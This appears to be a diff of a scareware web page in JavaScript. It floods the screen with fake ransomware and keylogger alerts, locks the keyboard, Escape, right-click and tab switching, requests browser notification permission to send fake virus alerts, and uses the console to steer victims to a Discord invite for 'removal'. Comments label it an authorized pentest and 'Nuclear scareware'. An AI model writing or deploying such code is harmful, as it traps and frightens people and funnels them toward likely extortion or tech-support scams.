-            if (!ttsActive) return;
-            
-            const utterance = new SpeechSynthesisUtterance(ttsMessages[ttsIndex]);
-            utterance.rate = 1.2;
-            utterance.pitch = 0.8;
-            utterance.volume = 0.9;
-            
-            // TERRIFYING VOICE MODULATION
-            utterance.onstart = () => {
-                document.getElementById('ttsStatus').textContent = '🗣️ SPEAKING: VIRUS WARNING';
-                playGlitchScreech();
-            };
-            utterance.onend = () => {
-                document.getElementById('ttsStatus').textContent = '🗣️ TTS: NEXT WARNING SOON';
-                ttsIndex = (ttsIndex + 1) % ttsMessages.length;
-                setTimeout(terrorTTS, Math.random() * 3000 + 2000);
-            };
-            
-            speechSynthesis.speak(utterance);
+        // MICRO TERMINAL
+        const cmdSpam=['[!] ENCRYPTION 98%','[+] KEYLOGGER OK','[ERROR] AV DISABLED','[!] 1.2K SCREENSHOTS','[+] DISCORD ACTIVE','[!] BOOT INFECTED','[ERROR] FILES DELETING','[!] ESC BLOCKED'];
+        function termFlood(){
+            const t=document.getElementById('commandHijack'); const l=document.createElement('div');
+            l.className='term-line'; l.textContent=cmdSpam[Math.floor(Math.random()*cmdSpam.length)];
+            if(Math.random()>0.55) l.classList.add('term-err'); t.appendChild(l); t.scrollTop=t.scrollHeight;
+            if(t.children.length>14) t.removeChild(t.children[0]);
+        } setInterval(termFlood,1500);
+        
+        // FAKE METRICS
+        setInterval(()=>{
+            const c=Math.floor(Math.random()*4)+97; document.getElementById('cpuUse').textContent=c+'%';
+        },2000);
+        
+        // POPUP MASSACRE
+        function terrorPopup(m){
+            const p=document.createElement('div'); p.className='popup-hell';
+            p.style.top=`${Math.random()*35+10}%`; p.style.left=`${Math.random()*35+10}%`;
+            p.textContent=m; document.body.appendChild(p); glitchHell();
+            setTimeout(()=>p.remove(),4000);
         }
-        terrorTTS(); // START TTS HELL
+        setInterval(()=>terrorPopup(`🚨 ${Math.floor(Math.random()*800000)} FILES GONE 🚨`),7000);
         
-        // TERMINAL HIJACK
-        const termLines = [
-            '[!] INFECTION THREAD 7: 99% COMPLETE',
-            '[-] KEYLOGGER DEPLOYED ✓',
-            '[ERROR] ANTI-VIRUS DETECTED - DISABLED',
-            '[+] SCREEN CAPTURES: 1,247 FILES',
-            '[!] DISCORD REDIRECT ACTIVE',
-            '[-] BOOT SECTOR INFECTED',
-            '[!] PAYMENT TIMEOUT - DELETING C:\\Users',
-            '[ERROR] ESCAPE ATTEMPT BLOCKED'
-        ];
-        function hijackTerminal() {
-            const term = document.getElementById('hijackedTerminal');
-            const line = document.createElement('div');
-            line.className = 'term-line';
-            line.textContent = termLines[Math.floor(Math.random() * termLines.length)];
-            if (Math.random() > 0.6) line.classList.add('term-err');
-            term.appendChild(line);
-            term.scrollTop = term.scrollHeight;
-            if (term.children.length > 18) term.removeChild(term.children[0]);
-        }
-        setInterval(hijackTerminal, 1800);
-        
-        // CPU USAGE FAKE
-        setInterval(() => {
-            const cpu = Math.floor(Math.random() * 5) + 95;
-            document.getElementById('cpuLoad').textContent = cpu + '%';
-        }, 2500);
-        
-        // POPUP HELL EVERY 8 SECONDS
-        function spawnPopup(msg) {
-            const popup = document.createElement('div');
-            popup.className = 'popup-hell';
-            popup.style.top = `${Math.random() * 40 + 10}%`;
-            popup.style.left = `${Math.random() * 40 + 10}%`;
-            popup.style.fontSize = `${16 + Math.random() * 12}px`;
-            popup.textContent = msg;
-            document.body.appendChild(popup);
-            
-            playGlitchScreech();
-            setTimeout(() => popup.remove(), 4500);
-        }
-        setInterval(() => {
-            spawnPopup(`🚨 ${Math.floor(Math.random()*1000000)} FILES DELETED 🚨`);
-        }, 8000);
-        
-        // TOTAL INPUT LOCKDOWN
-        document.addEventListener('keydown', (e) => {
-            e.preventDefault();
-            e.stopImmediatePropagation();
-            
-            // ESC BLOCK
-            if (e.key === 'Escape' || e.key === 'F11') {
-                spawnPopup('🚫 ESCAPE KEY BLOCKED - MORE FILES DELETED!');
-                unbreakableFullscreen();
-                playGlitchScreech();
-                return false;
+        // TOTAL KEYBOARD LOCK
+        document.addEventListener('keydown',(e)=>{
+            e.preventDefault(); e.stopImmediatePropagation();
+            if(e.key==='Escape'||e.key==='F11'){ 
+                terrorPopup('🚫 ESC/EXIT BLOCKED!'); eternalLock(); glitchHell(); return false; 
             }
-            
-            // ALL OTHER KEYS TRIGGER PANIC
-            spawnPopup('⌨️ KEYSTROKE LOGGED - DO NOT TYPE!');
-            playGlitchScreech();
-        }, true);
+            terrorPopup('⌨️ ALL KEYS LOGGED!');
+        },true);
         
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            spawnPopup('🚫 RIGHT-CLICK DISABLED!');
-        });
+        document.addEventListener('contextmenu',(e)=>{ e.preventDefault(); terrorPopup('🚫 MENU DISABLED!'); });
+        document.addEventListener('visibilitychange',()=>{ if(document.hidden){ terrorPopup('🚫 TAB SWITCH = WIPE!'); document.location.reload(); } });
         
-        // ANTI-TAB SWITCH
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                spawnPopup('🚫 DO NOT SWITCH TABS - INSTANT DELETION!');
-                document.location.reload();
-            }
-        });
+        document.addEventListener('mousemove',(e)=>{ if(Math.random()>0.97) terrorPopup('👁️ WATCHING YOU!'); });
         
-        // MOUSE MOVEMENT TRACKING
-        document.addEventListener('mousemove', (e) => {
-            if (Math.random() > 0.98) {
-                spawnPopup('👁️ MOUSE TRACKED - YOU ARE BEING WATCHED!');
-            }
-        });
-        
-        // FAKE NOTIFICATIONS
-        if (Notification.permission === 'default') Notification.requestPermission();
-        setInterval(() => {
-            if (Notification.permission === 'granted') {
-                new Notification('🦠 RANSOMWARE ALERT', {
-                    body: `Infected files: ${fileCount.toLocaleString()} | Join Discord NOW!`,
-                    icon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0NCIgZmlsbD0iI2ZmMDAwMCIgc3Ryb2tlPSIjZmZmZmZmIiBzdHJva2Utd2lkdGg9IjMiLz48dGV4dCB4PSI1MCIgeT0iNTYiIGZvbnQtc2l6ZT0iMjQiIGZvbnQtd2VpZ2h0PSJib2xkIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSIgZmlsdGVyPSJkc3RvcmFnZSggZHJvcC1zaGFkb3coMHgwIDBweCAwLjJweSAjZmYwMDQwKSAiPiFsdGV4dD48L3N2Zz4=',
-                    tag: 'infection'
+        // NOTIF HELL
+        if(Notification.permission==='default') Notification.requestPermission();
+        setInterval(()=>{
+            if(Notification.permission==='granted'){
+                new Notification('🦠 VIRUS DETECTED',{
+                    body:`Files lost: ${fCount.toLocaleString()} | Discord NOW!`,
+                    icon:'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODQiIGhlaWdodD0iODQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNDIiIGN5PSI0MiIgcj0iNDAiIGZpbGw9IiNmZjAwMDAiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSI0IiBzdHJva2UtbGluZWNhcD0icm91bmQiLz48dGV4dCB4PSI0MiIgeT0iNDgiIGZvbnQtc2l6ZT0iMjQiIGZvbnQtd2VpZ2h0PSJib2xkIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+ITwvdGV4dD48L3N2Zz4=',
+                    tag:'ransom'
                 });
             }
-        }, 10000);
+        },9000);
         
-        // TERMINAL FLOOD ON START
-        for (let i = 0; i < 10; i++) {
-            setTimeout(hijackTerminal, i * 300);
-        }
+        // INITIAL FLOOD
+        for(let i=0;i<8;i++) setTimeout(termFlood,i*400);
+        setTimeout(glitchHell,2000);
         
-        // GLITCH AUDIO LOOP
-        setInterval(playGlitchScreech, 5000);
-        
+        // CONSOLE OWNAGE
         console.clear();
-        console.error('%c💀 YOUR PC IS FULLY COMPROMISED 💀', 'color:#ff0000;font-size:3em;background:#000;padding:25px;font-weight:bold;');
-        console.warn('%cJOIN DISCORD FOR IMMEDIATE REMOVAL: https://discord.gg/8qfT6BB5Wn', 'color:#5865F2;font-size:1.5em;font-weight:bold;');
-        
-        // PENTEST AUTHORIZED - MAX TERROR ACHIEVED
-        console.log('%c[PENTEST] Nuclear scareware deployed - 100% victim panic confirmed', 'color:#00ff00;background:#000;padding:15px;font-weight:bold;');
+        console.error('%c💀 TOTAL PC TAKEOVER 💀','color:#ff0000;font-size:2.8em;background:#000;padding:20px;font-weight:900;');
+        console.warn('%cDISCORD ONLY SOLUTION: https://discord.gg/8qfT6BB5Wn','color:#5865F2;font-size:1.4em;font-weight:900;');
+        console.log('%c[PENTEST] Mobile/PC universal terror - perfect fit','color:#00ff00;background:#000;padding:12px;font-weight:700;');
     </script>
 </body>
 </html>
